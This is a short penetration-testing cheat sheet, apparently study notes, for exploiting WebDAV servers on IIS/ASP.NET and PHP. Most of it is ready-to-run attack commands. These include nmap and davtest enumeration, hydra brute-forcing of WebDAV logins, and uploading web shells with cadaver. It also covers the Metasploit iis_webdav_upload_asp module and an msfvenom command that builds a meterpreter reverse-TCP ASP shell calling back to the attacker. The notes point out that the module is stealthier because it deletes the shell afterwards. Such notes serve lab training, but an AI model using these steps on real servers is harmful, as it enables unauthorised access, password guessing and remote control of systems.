port 80/443

Static and dynamic web pages made in asp.net and php.

To connect to WebDAV you will need legitimate credentials.

Supported File Extensions
=
- .asp
- .aspx
- .config
- .php

Exploit Methodology
=
1. enumerate with nmap - find webdav directory
2. visit page, check credentials
3. use davtest to check for permissions, what files can be executed, made and edited
4. utilize cadaver to upload a shell made with msfvenom and setup msf handler or a kali web shell
5. visit webpage

you can also just use the Metasploit module, it will be more discrete, deletes shell.asp after a shell is created

Enumeration
=
`nmap -sV -p 80 --script http-enum host`  - lookfor webdav (potentially interesting folder)

Davtest
=
tool to scan, authenticate and exploit a WebDAV server

tests for what files can be created/editied on server, what files can be executed

usage:

`davtest -url http://IP/webdav`
`davtest -auth user:password -url http://IP/webdav`

Cadaver
=
tool supports file upload, download, on-screen display, crud, move and copy, property manipulation and resource locking.

Get web shells from the kali /user/share/webshells or use msfvenom

usage:

`cadaver http://IP/webdav`
	login with user credentials
	receive shell
	commands:
		`put /path/to/webshell` - uploads webs hell to  webdav (use asp shell in /usr/share/webshells/asp)

Bruteforce WebDAV
=
`hydra -L users.txt -P passwords.txt HOST-IP http-get /webdav/`

Metasploit
=
reverse shell with multi-handler:
1. Utilize msfvenom to create a reverse shell, then upload shell to WebDAV with cadaver
2. setup exploit/multi/handler on Metasploit
3. visit payload on webdav server

iis_webdav_upload_asp msf module:
1. `use exploit/windows/iis/iis_webdav_upload_asp`
2. setup -` set path to /webdav/shell.asp`
3. run

Msfvenom
=
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f asp > shell.asp`
